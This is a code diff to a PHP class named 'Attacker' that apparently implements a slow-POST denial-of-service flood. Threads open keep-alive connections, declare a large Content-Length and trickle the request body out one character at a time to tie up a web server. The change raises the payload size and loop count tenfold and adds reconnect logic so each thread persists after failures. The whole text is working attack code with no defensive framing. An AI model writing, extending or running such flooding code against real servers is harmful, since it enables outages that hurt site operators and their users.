@@ -60,22 +60,27 @@ class Attacker extends \Thread
                    "User-Agent: ".$agent."\r\n".
                    "Connection: keep-alive\r\n".
                    "Keep-Alive: 900\r\n".
-                   "Content-Length: 10000\r\n".
+                   "Content-Length: 100000\r\n".
                    "Content-Type: application/x-www-form-urlencoded\r\n\r\n");
       //println("")
       $i = $s = 0;
       $c = count($this->chars);
-      while(($i++)<9999) {
+      $err = 0;
+      while(($i++)<99999) {
         $a = $sock->write($this->chars[$s++]);
-        if($a === null)
-          println("Fail");
+	if($a === null) {
+	  $err++;
+	  println("No.".$this->id." post $i Fail");
+	  if($err>3) {
+            println("No.".$this->id." connect closd. Reconnecting...");
+	    break;
+	  }
+	}
         if($s==$c)
           $s = 0;
       }
       $sock->close();
     }catch(\Exception $e) {
-      //$this->shutdown();
-      //die($e);
       echo $e;
     }
   }
